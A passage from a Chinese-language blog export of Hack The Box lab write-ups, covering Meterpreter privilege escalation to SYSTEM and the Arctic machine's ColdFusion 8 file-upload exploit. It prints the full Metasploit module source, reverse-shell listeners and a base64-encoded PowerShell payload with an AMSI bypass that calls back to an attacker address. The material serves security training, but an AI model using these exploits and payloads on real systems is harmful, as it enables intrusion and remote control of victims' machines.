772   392   svchost.exe\n 788   392   svchost.exe\n 924   392   spoolsv.exe\n 952   392   msdtc.exe\n 1072  392   cisvc.exe\n 1112  392   svchost.exe\n 1168  392   inetinfo.exe\n 1204  392   svchost.exe\n 1308  392   VGAuthService.exe\n 1380  392   vmtoolsd.exe\n 1484  392   svchost.exe\n 1588  392   svchost.exe\n 1768  392   dllhost.exe\n 1908  392   alg.exe\n 1936  584   wmiprvse.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 2404  584   wmiprvse.exe\n 2604  344   logon.scr\n 2656  1484  w3wp.exe           x86   0        NT AUTHORITY\\NETWORK SERVICE  c:\\windows\\system32\\inetsrv\\w3wp.exe\n 3408  2656  rundll32.exe       x86   0                                      C:\\WINDOWS\\system32\\rundll32.exe\n 3892  1072  cidaemon.exe\n 3936  1072  cidaemon.exe\n 3972  1072  cidaemon.exe\n\nmeterpreter > migrate 1936\n[*] Migrating from 3408 to 1936...\n[*] Migration completed successfully.\n```\n尝试一下进程迁移\n\n```bash\nmeterpreter > getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE\n```\n进程迁移后可以执行 getuid 命令\n\n再尝试一下提权模块 exploit/windows/local/ms10\\_015\\_kitrap0d\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\n然后执行\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Launching notepad to host the exploit...\n[+] Process 408 launched.\n[*] Reflectively injecting the exploit DLL into 408...\n[*] Injecting exploit into 408 ...\n[*] Exploit injected. Injecting payload into 408...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.14\n[*] Meterpreter session 2 opened (10.10.16.4:5555 -> 10.10.10.14:1031) at 2022-03-27 21:33:07 -0400\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n成功提权到 system 权限\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\Harry\\Desktop\\user.txt (32 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\Harry\\Desktop\\user.txt'\nbdff5ec67c3cff017f2bedc146a5d869\n\nmeterpreter > cat 'c:\\Documents and Settings\\Administrator\\Desktop\\root.txt'\n9359e905a2c35f861f6a57cecf28bb7b\n\nmeterpreter >\n```\n成功拿到 user 和 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Arctic - Hackthebox","url":"/2022/03/25/Hackthebox/Easy/Hackthebox-Arctic/","content":"\n# Hackthebox - Arctic\n# 靶场信息\n![](Hackthebox-Arctic/e4c1173f-3f4c-4a90-9a78-925d46e5b127.png)\n\n# 靶场类型\n![](Hackthebox-Arctic/6274ec95-fd32-4351-9439-13c674bfa6f5.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]\n└─# nmap -sC -sV -oA nmap 10.10.10.11                     \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 02:23 EDT\nNmap scan report for 10.10.10.11\nHost is up (0.35s latency).\nNot shown: 997 filtered ports\nPORT      STATE SERVICE VERSION\n135/tcp   open  msrpc   Microsoft Windows RPC\n8500/tcp  open  fmtp?\n49154/tcp open  msrpc   Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 252.28 seconds\n```\n## HTTP\n这里的 8500 是一个 HTTP 服务，打开后需要等待约 10-20 秒的时间来加载。这台靶机的翻译叫做北极，我想原因就是因为太慢了吧。\n\n![](Hackthebox-Arctic/a1247cf5-7e0f-4a6e-82e3-8c4f4abd5102.png)\n\n![](Hackthebox-Arctic/6cd23f50-5a56-4ac7-87d9-5fa71e3d635c.png)\n\n在 CFIDE 目录下有一个 administrator 目录，我们进去看看\n\n![](Hackthebox-Arctic/1a24309f-23cb-4d09-bcf4-395cfa114edd.png)\n\n然后就会进入一个登录页面，赫然写着 ColdFusion 8，去 search 一下看看有没有相关的漏洞\n\n# 漏洞利用\n## SearchSploit\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]\n└─# searchsploit ColdFusion 8\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nAdobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                                               | cfm/webapps/36067.txt\nAdobe ColdFusion - Directory Traversal                                                                                                                                            | multiple/remote/14641.py\nAdobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                               | multiple/remote/16985.rb\nAdobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                                       | windows/remote/43993.py\nAdobe ColdFusion 2018 - Arbitrary File Upload                                                                                                                                     | multiple/webapps/45979.txt\nAdobe ColdFusion 9 - Administrative Authentication Bypass                                                                                                                         | windows/webapps/27755.txt\nAdobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                                                                   | multiple/webapps/40346.py\nAdobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                                                      | cfm/webapps/33170.txt\nAdobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                                                   | cfm/webapps/33167.txt\nAdobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                                                            | cfm/webapps/33169.txt\nAdobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                                             | cfm/webapps/33168.txt\nAllaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                                                               | multiple/remote/19093.txt\nAllaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                                                                     | windows/local/19220.c\nColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                                                                 | cfm/webapps/16788.rb\nColdFusion 9-10 - Credential Disclosure                                                                                                                                           | multiple/webapps/25305.py\nColdFusion MX - Missing Template Cross-Site Scripting                                                                                                                             | cfm/remote/21548.txt\nColdFusion Scripts Red_Reservations - Database Disclosure                                                                                                                         | asp/webapps/7440.txt\nMacromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                                                                         | multiple/remote/22867.pl\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)\n\n这条显示有一个文件上传，并且有 MSF 脚本，去运行试试\n\n## Msfconsole\n```bash\nmsf6 > search ColdFusion\n\nMatching Modules\n================\n\n   #  Name                                                           Disclosure Date  Rank       Check  Description\n   -  ----                                                           ---------------  ----       -----  -----------\n   0  exploit/multi/http/coldfusion_ckeditor_file_upload             2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload\n   1  exploit/multi/http/coldfusion_rds_auth_bypass                  2013-08-08       great      Yes    Adobe ColdFusion RDS Authentication Bypass\n   2  auxiliary/scanner/http/adobe_xml_inject                                         normal     No     Adobe XML External Entity Injection\n   3  auxiliary/gather/coldfusion_pwd_props                          2013-05-07       normal     Yes    ColdFusion 'password.properties' Hash Extraction\n   4  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute\n   5  auxiliary/scanner/http/coldfusion_locale_traversal                              normal     No     ColdFusion Server Check\n   6  auxiliary/scanner/http/coldfusion_version                                       normal     No     ColdFusion Version Scanner\n   7  exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce  2016-03-28       excellent  Yes    HID discoveryd command_blink_on Unauthenticated RCE\n\nInteract with a module by name or index. For example info 7, use 7 or use exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce\n```\n直接使用第一个 然后尝试是否可以成功\n\n```bash\nmsf6 > use 4\n[*] No payload configured, defaulting to generic/shell_reverse_tcp\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set payload generic/shell_reverse_tcp\npayload => generic/shell_reverse_tcp\n```\n使用相关的模块，并且设置好攻击模块\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show options \n\nModule options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name           Current Setting                                                             Required  Description\n   ----           ---------------                                                             --------  -----------\n   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm\n   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80                                                                          yes       The target port (TCP)\n   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections\n   VHOST                                                                                      no        HTTP server virtual host\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Universal Windows Target\n```\n这是需要设置的参数\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set rhosts 10.10.10.11\nrhosts => 10.10.10.11\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set rport 8500\nrport => 8500\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set lhost 10.10.16.4\nlhost => 10.10.16.4\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show options \n\nModule options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name           Current Setting                                                             Required  Description\n   ----           ---------------                                                             --------  -----------\n   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm\n   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          8500                                                                        yes       The target port (TCP)\n   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections\n   VHOST                                                                                      no        HTTP server virtual host\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Universal Windows Target\n```\n设置好相关的参数后，exploit 执行\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Sending our POST request...\n[-] Upload Failed...\n[*] Exploit completed, but no session was created.\n```\n这个 exploit 在执行后几乎就秒失败了，这是有问题的，因为这个网站不管执行什么，都应该有个大约 30 秒左右的缓冲，我们检查一下原因\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > show advanced \n\nModule advanced options (exploit/windows/http/coldfusion_fckeditor):\n\n   Name                    Current Setting                                     Required  Description\n   ----                    ---------------                                     --------  -----------\n   ContextInformationFile                                                      no        The information file that contains context information\n   DOMAIN                  WORKSTATION                                         yes       The domain to use for Windows authentication\n   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers\n   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload\n   EnableContextEncoding   false                                               no        Use transient context when encoding payloads\n   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification\n   HttpClientTimeout                                                           no        HTTP connection and receive timeout\n   HttpPassword                                                                no        The HTTP password to specify for authentication\n   HttpRawHeaders                                                              no        Path to ERB-templatized raw headers to append to existing headers\n   HttpTrace               false                                               no        Show the raw HTTP requests and responses\n   HttpTraceColors         red/blu                                             no        HTTP request and response colors for HttpTrace (unset to disable)\n   HttpTraceHeadersOnly    false                                               no        Show HTTP headers only in HttpTrace\n   HttpUsername                                                                no        The HTTP username to specify for authentication\n   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS\n                                                                                         1, TLS1.1, TLS1.2)\n   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests\n   VERBOSE                 false                                               no        Enable detailed status messages\n   WORKSPACE                                                                   no        Specify the workspace for this module\n   WfsDelay                2                                                   no        Additional delay in seconds to wait for a session\n\nPayload advanced options (generic/shell_reverse_tcp):\n\n   Name                        Current Setting  Required  Description\n   ----                        ---------------  --------  -----------\n   ARCH                                         no        The architecture that is being targeted\n   PLATFORM                                     no        The platform that is being targeted\n   ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST\n   ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system\n   ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT\n   ReverseListenerComm                          no        The specific communication channel to use for this listener\n   ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)\n   StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails\n   StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts\n   VERBOSE                     false            no        Enable detailed status messages\n   WORKSPACE                                    no        Specify the workspace for this module\n```\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > set VERBOSE TRUE\nVERBOSE => true\n```\n我们将 VERBOSE 设置为 TRUE 然后再执行\n\n```bash\nmsf6 exploit(windows/http/coldfusion_fckeditor) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Sending our POST request...\n[-] Upload Failed...\n[*] Exploit completed, but no session was created.\n```\n然后执行后还是没有得到相关的信息，以及详细情况，我们抓个包看看内容\n\n![](Hackthebox-Arctic/7a23b53c-79ef-4988-9a40-5ffc890ffc0c.png)\n\n![](Hackthebox-Arctic/7aee663c-0163-4649-9031-826e2759afd8.png)\n\n添加一个新的代理，设置端口为 8500，并将流量转发到 10.10.10.11的 8500 端口\n\n![](Hackthebox-Arctic/cb25197d-5eba-4baa-a0bb-daede99eefc4.png)\n\n我们切换好代理，然后去执行\n\n![](Hackthebox-Arctic/ff248858-b98f-49b8-9b4d-03613178cf7f.png)\n\n成功抓到了 payload 内容\n\n我们发送到 repeater，然后执行\n\n![](Hackthebox-Arctic/4b654c17-bc7a-4166-adc6-1ab740912926.png)\n\n![](Hackthebox-Arctic/37fc7ada-a333-4ba2-bed0-632eeacb8147.png)\n\n在下面可以看到，有一段命令是向我们的 ip 和端口回弹一个shell，但是被上面的 00 截断还是什么玩意儿的给截断了还是吧啦吧啦的，反正就是没执行成功，但是文件应该上去了。在本地使用 nc 监听一个端口，然后手动访问一下我们上传的文件\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\n```\n```bash\nhttp://10.10.10.11:8500/userfiles/file/MMJPPXXEPA.jsp\n```\n然后等待 30 秒\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49440\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>whoami\nwhoami\narctic\\tolis\n```\n成功拿到一个 shell\n\n```bash\nC:\\Users\\tolis\\Desktop>cd C:\\Users\\tolis\\Desktop\ncd C:\\Users\\tolis\\Desktop\n\nC:\\Users\\tolis\\Desktop>type user.txt\ntype user.txt\nb30ff1922f046d55ccb4b125ea8f1539\n```\n成功拿到一个 user 权限的 flag 文件\n\n### Msf 修复\n查找一下 windows/http/coldfusion\\_fckeditor 的地址\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# locate windows/http/coldfusion_fckeditor                                                                                                                                                                    1 ⨯\n/usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb\n```\n查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',\n      'Description'    => %q{\n          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload\n        and Execute vulnerability.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2265' ],\n          [ 'OSVDB', '55684'],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-03'\n    ))\n\n    register_options(\n      [\n        OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),\n      ])\n  end\n\n  def exploit\n\n    page  = rand_text_alpha_upper(rand(10) + 1) + \".jsp\"\n\n    dbl = Rex::MIME::Message.new\n    dbl.add_part(payload.encoded, \"application/x-java-archive\", nil, \"form-data; name=\\\"newfile\\\"; filename=\\\"#{rand_text_alpha_upper(8)}.txt\\\"\")\n    file = dbl.to_s\n    file.strip!\n\n    print_status(\"Sending our POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'           => normalize_uri(datastore['FCKEDITOR_DIR']),\n        'query'         => \"Command=FileUpload&Type=File&CurrentFolder=/#{page}%00\",\n        'version'       => '1.1',\n        'method'        => 'POST',\n        'ctype'         => 'multipart/form-data; boundary=' + dbl.bound,\n        'data'          => file,\n      }, 5)\n\n    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )\n      print_status(\"Upload succeeded! Executing payload...\")\n\n      send_request_raw(\n        {\n          # default path in Adobe ColdFusion 8.0.1.\n          'uri'         => '/userfiles/file/' + page,\n          'method'      => 'GET',\n        }, 5)\n\n      handler\n    else\n      print_error(\"Upload Failed...\")\n      return\n    end\n\n  end\nend\n```\n这里将 74 行和 84 行的等待 5 秒更换为等待 25 秒即可成功使用\n\n# 权限提升\n## 失败的方法\n> [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)\n\n这里使用 unicorn 工具反向一个 Meterpreter 的 shell 回来\n\n使用 unicorn 生成一下\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# ./unicorn.py windows/meterpreter/reverse_tcp 10.10.16.4 5555\n```\n然后会生成两个文件\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# cat unicorn.rc \nuse multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 10.10.16.4\nset LPORT 5555\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n```\n一个是加载监听器的所有命令\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]\n└─# cat powershell_attack.txt \n# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C \"sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() ('JABWAGUAbABqAG4AIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlACIAKwAiAHIAIgArACIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAkAFYAZQBsAGoAbgA7ACQAbQBFAE4AYQBiAGkAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZAAiACsAIgBsACIAKwAiAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAZgBmACIAKwAiAGUAIgArACIAcgAiACkAOwAkAE8AbQBSAGMAaQBpAHUAUwBlAFUAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQBFAE4AYQBiAGkALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQATwBtAFIAYwBpAGkAdQBTAGUAVQApADsAJABIAFUAQQBRAFQAVABrACAAPQAgACgAIgB9AHgAZgBaAGYAeABsAHUAUgAsACAAfQB4AGkAagBYAGgASwB0AE8ALAAgAH0AeAB9AH0ALAAgAH0AeAB9ADcALAAgAH0AeAA4AH0ALAAgAH0AeABDADMAIgApAC4AcgBlAHAAbABhAGMAZQAoACIAaQBqAFgAaABLAHQATwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBmAFoAZgB4AGwAdQBSACIALAAgACIAQgA4ACIAKQA7ACQASABVAEEAUQBUAFQAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAEgAVQBBAFEAVABUAGsAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABIAFUAQQBRAFQAVABrACwAIAAwACwAIAAkAG0ARQBOAGEAYgBpACwAIAA2ACkA')\"\n\n# actual unicorn payload\npowershell /w 1 /C \"sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() ('JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH